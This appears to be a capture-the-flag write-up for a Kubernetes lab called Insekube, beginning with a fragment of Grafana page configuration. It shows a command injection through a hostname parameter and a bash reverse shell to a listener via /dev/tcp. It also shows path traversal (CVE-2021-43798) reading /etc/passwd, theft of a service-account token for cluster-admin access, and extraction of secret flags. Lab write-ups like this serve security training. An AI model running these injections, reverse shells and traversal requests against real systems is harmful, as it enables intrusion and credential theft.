Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/candlestick/img/candlestick.svg","large":"public/app/plugins/panel/candlestick/img/candlestick.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/candlestick/module","name":"Candlestick","signature":"internal","skipDataQuery":false,"sort":100,"state":"beta"},"dashlist":{"baseUrl":"public/app/plugins/panel/dashlist","hideFromList":false,"id":"dashlist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"List of dynamic links to other dashboards","links":null,"logos":{"small":"public/app/plugins/panel/dashlist/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/dashlist/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/dashlist/module","name":"Dashboard list","signature":"internal","skipDataQuery":true,"sort":16,"state":""},"gauge":{"baseUrl":"public/app/plugins/panel/gauge","hideFromList":false,"id":"gauge","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Standard gauge visualization","links":null,"logos":{"small":"public/app/plugins/panel/gauge/img/icon_gauge.svg","large":"public/app/plugins/panel/gauge/img/icon_gauge.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/gauge/module","name":"Gauge","signature":"internal","skipDataQuery":false,"sort":4,"state":""},"geomap":{"baseUrl":"public/app/plugins/panel/geomap","hideFromList":false,"id":"geomap","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Geomap panel","links":null,"logos":{"small":"public/app/plugins/panel/geomap/img/icn-geomap.svg","large":"public/app/plugins/panel/geomap/img/icn-geomap.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/geomap/module","name":"Geomap","signature":"internal","skipDataQuery":false,"sort":100,"state":"beta"},"gettingstarted":{"baseUrl":"public/app/plugins/panel/gettingstarted","hideFromList":true,"id":"gettingstarted","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/gettingstarted/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/gettingstarted/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/gettingstarted/module","name":"Getting Started","signature":"internal","skipDataQuery":true,"sort":100,"state":""},"graph":{"baseUrl":"public/app/plugins/panel/graph","hideFromList":false,"id":"graph","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"The old default graph panel","links":null,"logos":{"small":"public/app/plugins/panel/graph/img/icn-graph-panel.svg","large":"public/app/plugins/panel/graph/img/icn-graph-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/graph/module","name":"Graph (old)","signature":"internal","skipDataQuery":false,"sort":13,"state":""},"heatmap":{"baseUrl":"public/app/plugins/panel/heatmap","hideFromList":false,"id":"heatmap","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Like a histogram over time","links":[{"name":"Brendan Gregg - Heatmaps","url":"http://www.brendangregg.com/heatmaps.html"},{"name":"Brendan Gregg - Latency Heatmaps","url":" http://www.brendangregg.com/HeatMaps/latency.html"}],"logos":{"small":"public/app/plugins/panel/heatmap/img/icn-heatmap-panel.svg","large":"public/app/plugins/panel/heatmap/img/icn-heatmap-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/heatmap/module","name":"Heatmap","signature":"internal","skipDataQuery":false,"sort":10,"state":""},"histogram":{"baseUrl":"public/app/plugins/panel/histogram","hideFromList":false,"id":"histogram","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/histogram/img/histogram.svg","large":"public/app/plugins/panel/histogram/img/histogram.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/histogram/module","name":"Histogram","signature":"internal","skipDataQuery":false,"sort":12,"state":"beta"},"logs":{"baseUrl":"public/app/plugins/panel/logs","hideFromList":false,"id":"logs","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/logs/img/icn-logs-panel.svg","large":"public/app/plugins/panel/logs/img/icn-logs-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/logs/module","name":"Logs","signature":"internal","skipDataQuery":false,"sort":100,"state":""},"news":{"baseUrl":"public/app/plugins/panel/news","hideFromList":false,"id":"news","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"RSS feed reader","links":null,"logos":{"small":"public/app/plugins/panel/news/img/news.svg","large":"public/app/plugins/panel/news/img/news.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/news/module","name":"News","signature":"internal","skipDataQuery":true,"sort":17,"state":"beta"},"nodeGraph":{"baseUrl":"public/app/plugins/panel/nodeGraph","hideFromList":false,"id":"nodeGraph","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/nodeGraph/img/icn-node-graph.svg","large":"public/app/plugins/panel/nodeGraph/img/icn-node-graph.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/nodeGraph/module","name":"Node Graph","signature":"internal","skipDataQuery":false,"sort":100,"state":"beta"},"piechart":{"baseUrl":"public/app/plugins/panel/piechart","hideFromList":false,"id":"piechart","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"The new core pie chart visualization","links":null,"logos":{"small":"public/app/plugins/panel/piechart/img/icon_piechart.svg","large":"public/app/plugins/panel/piechart/img/icon_piechart.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/piechart/module","name":"Pie chart","signature":"internal","skipDataQuery":false,"sort":8,"state":""},"pluginlist":{"baseUrl":"public/app/plugins/panel/pluginlist","hideFromList":false,"id":"pluginlist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Plugin List for Grafana","links":null,"logos":{"small":"public/app/plugins/panel/pluginlist/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/pluginlist/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/pluginlist/module","name":"Plugin list","signature":"internal","skipDataQuery":true,"sort":100,"state":""},"stat":{"baseUrl":"public/app/plugins/panel/stat","hideFromList":false,"id":"stat","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Big stat values \u0026 sparklines","links":null,"logos":{"small":"public/app/plugins/panel/stat/img/icn-singlestat-panel.svg","large":"public/app/plugins/panel/stat/img/icn-singlestat-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/stat/module","name":"Stat","signature":"internal","skipDataQuery":false,"sort":3,"state":""},"state-timeline":{"baseUrl":"public/app/plugins/panel/state-timeline","hideFromList":false,"id":"state-timeline","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"State changes and durations","links":null,"logos":{"small":"public/app/plugins/panel/state-timeline/img/timeline.svg","large":"public/app/plugins/panel/state-timeline/img/timeline.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/state-timeline/module","name":"State timeline","signature":"internal","skipDataQuery":false,"sort":9,"state":"beta"},"status-history":{"baseUrl":"public/app/plugins/panel/status-history","hideFromList":false,"id":"status-history","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Periodic status history","links":null,"logos":{"small":"public/app/plugins/panel/status-history/img/status.svg","large":"public/app/plugins/panel/status-history/img/status.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/status-history/module","name":"Status history","signature":"internal","skipDataQuery":false,"sort":11,"state":"beta"},"table":{"baseUrl":"public/app/plugins/panel/table","hideFromList":false,"id":"table","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Supports many column styles","links":null,"logos":{"small":"public/app/plugins/panel/table/img/icn-table-panel.svg","large":"public/app/plugins/panel/table/img/icn-table-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/table/module","name":"Table","signature":"internal","skipDataQuery":false,"sort":6,"state":""},"table-old":{"baseUrl":"public/app/plugins/panel/table-old","hideFromList":false,"id":"table-old","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Table Panel for Grafana","links":null,"logos":{"small":"public/app/plugins/panel/table-old/img/icn-table-panel.svg","large":"public/app/plugins/panel/table-old/img/icn-table-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/table-old/module","name":"Table (old)","signature":"internal","skipDataQuery":false,"sort":100,"state":"deprecated"},"text":{"baseUrl":"public/app/plugins/panel/text","hideFromList":false,"id":"text","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Supports markdown and html content","links":null,"logos":{"small":"public/app/plugins/panel/text/img/icn-text-panel.svg","large":"public/app/plugins/panel/text/img/icn-text-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/text/module","name":"Text","signature":"internal","skipDataQuery":true,"sort":14,"state":""},"timeseries":{"baseUrl":"public/app/plugins/panel/timeseries","hideFromList":false,"id":"timeseries","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Time based line, area and bar charts","links":null,"logos":{"small":"public/app/plugins/panel/timeseries/img/icn-timeseries-panel.svg","large":"public/app/plugins/panel/timeseries/i100 28089    0 28089    0     0  3918k      0 --:--:-- --:--:-- --:--:-- 3918k
":"","updated":""},"module":"app/plugins/panel/timeseries/module","name":"Time series","signature":"internal","skipDataQuery":false,"sort":1,"state":""},"welcome":{"baseUrl":"public/app/plugins/panel/welcome","hideFromList":true,"id":"welcome","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/welcome/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/welcome/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/welcome/module","name":"Welcome","signature":"internal","skipDataQuery":true,"sort":100,"state":""}},"passwordHint":"password","pluginAdminEnabled":true,"pluginAdminExternalManageEnabled":false,"pluginCatalogHiddenPlugins":[""],"pluginCatalogURL":"https://grafana.com/grafana/plugins/","pluginsToPreload":[],"recordedQueries":{"enabled":false},"rendererAvailable":false,"rendererVersion":"","rudderstackDataPlaneUrl":"","rudderstackWriteKey":"","samlEnabled":false,"samlName":"SAML","sentry":{"enabled":false,"dsn":"","customEndpoint":"/log","sampleRate":1},"sigV4AuthEnabled":false,"unifiedAlertingEnabled":true,"verifyEmailEnabled":false,"viewersCanEdit":false},
        navTree: [{"id":"dashboards","text":"Dashboards","section":"core","subTitle":"Manage dashboards and folders","icon":"apps","url":"/","sortWeight":-1800,"children":[{"id":"home","text":"Home","icon":"home-alt","url":"/","hideFromTabs":true},{"id":"divider","text":"Divider","divider":true,"hideFromTabs":true},{"id":"manage-dashboards","text":"Browse","icon":"sitemap","url":"/dashboards"},{"id":"playlists","text":"Playlists","icon":"presentation-play","url":"/playlists"}]},{"id":"alerting","text":"Alerting","section":"core","subTitle":"Alert rules and notifications","icon":"bell","url":"/alerting/list","sortWeight":-1600,"children":[{"id":"alert-list","text":"Alert rules","icon":"list-ul","url":"/alerting/list"},{"id":"silences","text":"Silences","icon":"bell-slash","url":"/alerting/silences"},{"id":"groups","text":"Alert groups","icon":"layer-group","url":"/alerting/groups"}]},{"id":"help","text":"Help","section":"config","subTitle":"Grafana v8.3.0-beta2 (8d74cc357)","icon":"question-circle","url":"#","sortWeight":-1100}],
        themePaths: {
          light: 'public/build/grafana.light.cb8720c05bfd4aaf3291.css',
          dark: 'public/build/grafana.dark.cb8720c05bfd4aaf3291.css'
        }
      };

      window.__grafana_load_failed = function() {
        var preloader = document.getElementsByClassName("preloader");
        if (preloader.length) {
          preloader[0].className = "preloader preloader--done";
        }
      }

      
      window.onload = function() {
        if (window.__grafana_app_bundle_loaded) {
          return;
        }
        window.__grafana_load_failed();
      };

      
      </script><script nonce="" src="public/build/runtime.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/3144.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/4210.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/8489.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/6278.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/6518.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/app.cb8720c05bfd4aaf3291.js"></script><script nonce="">performance.mark('frontend_boot_js_done_time_seconds');</script></body></html>

https://www.exploit-db.com/exploits/50581
```
What is the version of Grafana running on the machine?
*8.3.0-beta2*
What is the CVE you've found?
*CVE-2021-43798*
### Lateral Movement
Kubernetes stores the token of the service account running a pod in `/var/run/secrets/kubernetes.io/serviceaccount/token`.
Use the LFI vulnerability to extract the token. The token is a `JWT` signed by the cluster.
Use the `--token` flag in `kubectl` to use the new service account. Once again use `kubectl` to check the permissions of this account.
Insekube
```shell-session
challenge@syringe:/tmp$ ./kubectl auth can-i --list --token=${TOKEN}
Resources                                       Non-Resource URLs                     Resource Names   Verbs
*.*                                             []                                    []               [*]
                                                [*]                                   []               [*]
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
The account can do `*` verb on `*.*` resource. This means it is a `cluster-admin`. With this service account, you will be able to run any `kubectl` command. For example, try getting a list of pods.
Insekube
```shell-session
challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
NAME                       READY   STATUS    RESTARTS       AGE
grafana-57454c95cb-v4nrk   1/1     Running   10 (17d ago)   41d
syringe-79b66d66d7-7mxhd   1/1     Running   1 (17d ago)    18d
```
Use `kubectl exec` to get a shell in the Grafana pod. You will find flag 3 in the environment variables.
Insekube
```shell-session
challenge@syringe:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
Unable to use a TTY - input is not a terminal or the right kind of file
hostname
grafana-57454c95cb-v4nrk
```
Answer the questions below

## Exploitation
```text
10.10.124.104/?hostname=10.8.19.103

ING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
64 bytes from 10.8.19.103: icmp_seq=1 ttl=61 time=207 ms
64 bytes from 10.8.19.103: icmp_seq=2 ttl=61 time=202 ms

--- 10.8.19.103 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1000ms
rtt min/avg/max/mdev = 202.488/204.904/207.320/2.416 ms

10.8.19.103;id

PING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
64 bytes from 10.8.19.103: icmp_seq=1 ttl=61 time=212 ms
64 bytes from 10.8.19.103: icmp_seq=2 ttl=61 time=205 ms

--- 10.8.19.103 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 205.403/208.551/211.700/3.148 ms
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)

revshell

10.8.19.103;bash -i >& /dev/tcp/10.8.19.103/1337 0>&1

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.124.104] 49662
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
challenge@syringe-79b66d66d7-6xdjz:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<z:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash: python3: command not found

/usr/bin/script -qc /bin/bash /dev/null

challenge@syringe-79b66d66d7-6xdjz:~$ pwd
pwd
/home/challenge
challenge@syringe-79b66d66d7-6xdjz:~$ cd /
cd /
challenge@syringe-79b66d66d7-6xdjz:/$ ls -lah
ls -lah
total 116M
drwxr-xr-x   1 root root 4.0K Mar  3 23:26 .
drwxr-xr-x   1 root root 4.0K Mar  3 23:26 ..
-rwxr-xr-x   1 root root    0 Mar  3 23:26 .dockerenv
lrwxrwxrwx   1 root root    7 Jan 19  2021 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Apr 15  2020 boot
drwxr-xr-x   5 root root  360 Mar  3 23:26 dev
drwxr-xr-x   1 root root 4.0K Mar  3 23:26 etc
-rw-r--r--   1 root root 116M Jan 19  2021 go1.15.7.linux-amd64.tar.gz
drwxr-xr-x   1 root root 4.0K Jan  6  2022 home
lrwxrwxrwx   1 root root    7 Jan 19  2021 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jan 19  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jan 19  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jan 19  2021 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4.0K Jan 19  2021 media
drwxr-xr-x   2 root root 4.0K Jan 19  2021 mnt
drwxr-xr-x   2 root root 4.0K Jan 19  2021 opt
dr-xr-xr-x 407 root root    0 Mar  3 23:26 proc
drwx------   1 root root 4.0K Jan  7  2022 root
drwxr-xr-x   1 root root 4.0K Mar  3 23:26 run
lrwxrwxrwx   1 root root    8 Jan 19  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Jan 19  2021 srv
dr-xr-xr-x  13 root root    0 Mar  3 23:26 sys
drwxrwxrwt   1 root root 4.0K Jan  7  2022 tmp
drwxr-xr-x   1 root root 4.0K Jan 19  2021 usr
drwxr-xr-x   1 root root 4.0K Jan 19  2021 var

challenge@syringe-79b66d66d7-6xdjz:/$ env
env
KUBERNETES_SERVICE_PORT_HTTPS=443
GRAFANA_SERVICE_HOST=10.105.120.1
KUBERNETES_SERVICE_PORT=443
HOSTNAME=syringe-79b66d66d7-6xdjz
SYRINGE_PORT=tcp://10.103.9.166:3000
GRAFANA_PORT=tcp://10.105.120.1:3000
SYRINGE_SERVICE_HOST=10.103.9.166
SYRINGE_PORT_3000_TCP=tcp://10.103.9.166:3000
GRAFANA_PORT_3000_TCP=tcp://10.105.120.1:3000
PWD=/
SYRINGE_PORT_3000_TCP_PROTO=tcp
HOME=/home/challenge
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
LS_COLORS=
GOLANG_VERSION=1.15.7
FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
SHLVL=2
SYRINGE_PORT_3000_TCP_PORT=3000
GRAFANA_PORT_3000_TCP_PORT=3000
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
GRAFANA_SERVICE_PORT=3000
SYRINGE_PORT_3000_TCP_ADDR=10.103.9.166
SYRINGE_SERVICE_PORT=3000
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
GRAFANA_PORT_3000_TCP_PROTO=tcp
PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
OLDPWD=/home/challenge
GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1
_=/usr/bin/env
```
![[Pasted image 20230303183254.png]]
What is flag 1?
### Interacting with kubernetes
Kubernetes exposes an HTTP API to control the cluster. All resources in the cluster can be accessed and modified through this API. The easiest way to interact with the API is to use the `kubectl` CLI. You could also interact with the API directly using `curl` or `wget` if you don't have write access and `kubectl` is not already present, Here is a [good article](https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c) on that.
The `kubectl` install instructions can be found [here](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux). However, the binary is located in the `/tmp` directory. In the event you run into a scenario where the binary is not available, it's as simple as [downloading the binary](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) to your machine and serving it (with a python HTTP server for example) so it is accessible from the container.
Now let's move to the `/tmp` directory where the `kubectl`  is conveniently located for you and try the `kubectl get pods` command. You'll notice a  forbidden error which means the service account running this pod does not have enough permissions.
Insekube
```shell-session
challenge@syringe:~$ cd /tmp

challenge@syringe:/tmp$ ls -la
total 45504
drwxrwxrwt 1 root root     4096 Jan 30 19:56 .
drwxr-xr-x 1 root root     4096 Feb 17 20:03 ..
-rwxrwxr-x 1 root root 46587904 Jan 30 19:17 kubectl

challenge@syringe:/tmp$ ./kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"
```
You can check your permissions using `kubectl auth can-i --list`. The results show this service account can list and get secrets in this namespace.
Insekube
```shell-session
challenge@syringe:/tmp$ ./kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```
Answer the questions below
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"

┌──(witty㉿kali)-[~/Downloads]
└─$ ls -la kubectl 
-rw-r--r-- 1 witty witty 48029696 Mar  3 18:42 kubectl

challenge@syringe-79b66d66d7-6xdjz:/$ find / -name "kubectl"
find / -name "kubectl"
find: '/etc/ssl/private': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/root': Permission denied

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.124.104 - - [03/Mar/2023 18:54:56] "GET /kubectl HTTP/1.1" 200 -

challenge@syringe-79b66d66d7-6xdjz:/tmp$ cd /tmp
cd /tmp
challenge@syringe-79b66d66d7-6xdjz:/tmp$ wget http://10.8.19.103:1234/kubectl
wget http://10.8.19.103:1234/kubectl
--2023-03-03 23:54:55--  http://10.8.19.103:1234/kubectl
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 48029696 (46M) [application/octet-stream]
Saving to: 'kubectl'

     0K .......... .......... .......... .......... ..........  0%  120K 6m32s
    50K .......... .......... .......... .......... ..........  0%  242K 4m52s
   100K .......... .......... .......... .......... ..........  0% 2.23M 3m22s

 46850K .......... .......... .......... .......... .......... 99% 5.94M 0s
 46900K ....                                                  100% 13.1M=24s

2023-03-03 23:55:20 (1.90 MB/s) - 'kubectl' saved [48029696/48029696]

challenge@syringe-79b66d66d7-6xdjz:/tmp$ chmod +x kubectl
chmod +x kubectl
challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods
./kubectl get pods
Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"

challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i create pods
./kubectl auth can-i create pods
no

challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i --list
./kubectl auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
secrets                                         []                                    []               [get list]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []
```
No answer needed
Completed
### Kubernetes Secrets
Kubernetes stores secret values in resources called Secrets these then get mounted into pods either as environment variables or files.
You can use `kubectl` to list and get secrets. The content of the secret is stored base64 encoded.
You will find flag 2 in a Kubernetes secret.
Insekube
```shell-session
challenge@syringe:/tmp$ ./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      41d
developer-token-74lck   kubernetes.io/service-account-token   3      41d
secretflag              Opaque                                1      41d
syringe-token-g85mg     kubernetes.io/service-account-token   3      41d
```
Use `kubectl describe secret secretflag` to list all data contained in the secret. Notice the flag data isn't being outputted with this command, so let's choose the JSON output format with: `kubectl get secret secretflag -o 'json'`
Answer the questions below
```text
challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get secrets
./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-8q4vp     kubernetes.io/service-account-token   3      24h
developer-token-rnmqz   kubernetes.io/service-account-token   3      24h
secretflag              Opaque                                1      24h
syringe-token-6w8tq     kubernetes.io/service-account-token   3      24h

challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl describe secret secretflag
./kubectl describe secret secretflag
Name:         secretflag
Namespace:    default
Labels:       <none>
Annotations:  <none>

Type:  Opaque

Data
====
flag:  38 bytes

challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get secret secretflag -o 'json'
<djz:/tmp$ ./kubectl get secret secretflag -o 'json'
{
    "apiVersion": "v1",
    "data": {
        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
    },
    "kind": "Secret",
    "metadata": {
        "annotations": {
            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
        },
        "creationTimestamp": "2023-03-02T23:51:30Z",
        "name": "secretflag",
        "namespace": "default",
        "resourceVersion": "819",
        "uid": "f341b287-9f62-41c2-9eac-4d1a27ad76dc"
    },
    "type": "Opaque"
}

┌──(witty㉿kali)-[~/Downloads]
└─$ echo 'ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=' | base64 -d
flag{df2a636de15108a4dc41135d930d8ec1}
```
What is flag 2?
```text
challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is http://10.105.120.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
</alertlist/../../../../../../../../../../etc/passwd
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1230  100  1230    0     0   240k      0 --:--:-- --:--:-- --:--:--  240k
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin

or

